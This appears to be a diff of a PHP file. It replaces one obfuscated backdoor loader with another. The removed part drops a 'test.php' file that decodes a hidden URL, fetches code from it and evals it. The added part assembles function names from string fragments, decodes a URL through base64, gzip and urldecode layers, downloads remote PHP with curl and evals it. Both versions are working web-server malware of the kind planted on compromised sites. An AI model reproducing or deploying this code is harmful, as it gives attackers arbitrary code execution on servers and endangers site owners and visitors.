@@ -1,105 +1,42 @@
 <?php
-// Nama file yang ingin dibuat
-$filename = "test.php";
 
-// Isi file yang akan ditulis
-$content = <<<'PHP'
-<?php
-$fgc = 'f'.'i'.'le'.'_ge'.'t_'.'co'.'n'.'te'.'nt'.'s';
-function bunvis($url)
+function Lucen($url)
 {
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($ch);
   curl_close($ch);
   return $response;
 }
-function bunvisGanteng($ipt)
-{
-  $dx = 'd'.'e'.'c'.'h'.'e'.'x';
-  $bec = 'ba'.'s'.'e6'.'4_'.'en'.'co'.'de';
-  $odr = 'or'.'d';
-  $sln = 'st'.'rl'.'en';
-  $strt = 's'.'tr_'.'rot'.'13';
-  $hex = '';
-  for ($i = 0; $i < $sln($ipt); $i++) {
-    $hex .= $dx($odr($ipt[$i]));
-  }
-  $base64 = $bec($hex);
-  return $strt($base64);
-}
-function bunny($my_self)
-{
-  $sln = 'st'.'rl'.'en';
-  $strt = 'st'.'r_'.'r'.'ot13';
-  $bdec = 'b'.'as'.'e'.'64_de'.'co'.'de';
-  $hrc = 'ch'.'r';
-  $hxc = 'h'.'ex'.'de'.'c';
-  $subr = 's'.'ub'.'st'.'r';
-  $rEq = $strt($my_self);
-  $bsfD = $bdec($rEq);
-  $record = '';
-  for ($i = 0; $i < $sln($bsfD); $i += 2) {
-    $record .= $hrc($hxc($subr($bsfD, $i, 2)));
-  }
-  return $record;
-}
-$my_self = 'Awt3AQp0AmN3ZmAuZzLlMwLmAwD2MGWyAzR3ZmL0AwH2LmL5AmL3ZwWyAzH2AGp0ZzL2AmL4ZzL2Lmp1AwZ2AGMyAwV3BGp0AwHlMwDkAmV2ZmL4Awx0LmMzAwp3ZmDjAzD2ZGL5AzHlMwL4AwR3ZwL0ZzD3AwZkZzH3AQp4AmD=';
-$record = bunny($my_self);
-$response = @$fgc($record);
-if (empty($response)) {
-  $response = bunvis($record);
-}
-if (is_string($response)) {
-  eval('?>' . $response);
+$mlyslf = "T2ZYZ3hrNXlabTVnR3BNaU9RbXZ4eTNUSWp2WktLRWdCYjRSNkRlSnpMS0NrcEtGWTFkbFExY2dPaW9zUnl2ZlRNa296U3BOTGkxS0xrL0x5UzFMd1N2ZVQ4WEtCY1RtbHlhbDVTWlVrcWtPMVlsSnlSNlo=";
+
+$bed = "b"."as"."e"."6"."4"."_"."d"."ec"."o"."d"."e";
+$slen = "s"."tr"."le"."n";
+$cl = "c"."ei"."l";
+$stsr = "s"."u"."bs"."t"."r";
+$gzp = "g"."zu"."nc"."o"."m"."p"."r"."e"."s"."s";
+$udc = "u"."r"."ld"."e"."c"."od"."e";
+
+$dxcm = $bed($mlyslf);
+$len = $slen($dxcm);
+$csz = $cl($len / 3);
+$pac = $stsr($dxcm, 0, $len - ($csz * 2));
+$paa = $stsr($dxcm, $slen($pac), $csz);
+$pab = $stsr($dxcm, $slen($pac) + $csz);
+$deng3 = $paa . $pab . $pac;
+$dang2 = $bed($deng3);
+$dung1 = $gzp($dang2);
+if ($dung1 === false) die("Error\n");
+$lyslf = $udc($dung1);
+
+$rlyslf = Lucen($lyslf);
+if ($rlyslf) {
+  $prlc = "p"."r"."eg"."_"."r"."e"."p"."l"."ac"."e";
+  $mslf = $prlc('/^\s*<\?(php)?/i', '', $rlyslf);
+  $mslf = $prlc('/\?>\s*$/', '', $mslf);
+  eval($mslf);
 } else {
-  echo "Error: Unable to retrieve content.";
+  echo "Not Found.\n";
 }
-?>
-PHP;
-
-// ========== Metode 1: file_put_contents ==========
-$success = false;
-
-if (function_exists('file_put_contents')) {
-    $result = @file_put_contents($filename, $content);
-    if ($result !== false) {
-        $success = true;
-    }
-}
-
-// ========== Metode 2: fopen + fwrite ==========
-if (!$success && function_exists('fopen')) {
-    $fp = @fopen($filename, "w");
-    if ($fp) {
-        if (@fwrite($fp, $content) !== false) {
-            fclose($fp);
-            $success = true;
-        } else {
-            fclose($fp);
-        }
-    }
-}
-
-// ========== Metode 3: popen (jika available & tidak diblok hosting) ==========
-if (!$success && function_exists('popen')) {
-    $cmd = "cat > " . escapeshellarg($filename);
-    $pp = @popen($cmd, 'w');
-    if ($pp) {
-        if (@fwrite($pp, $content) !== false) {
-            pclose($pp);
-            $success = true;
-        } else {
-            pclose($pp);
-        }
-    }
-}
-
-// ========== Hasil ==========
-if ($success) {
-    echo "File '$filename' berhasil dibuat dan isinya 100% sesuai!";
-} else {
-    echo "Gagal membuat file '$filename'. Semua metode gagal (file_put_contents, fopen, popen). Cek permission folder.";
-}
-?>
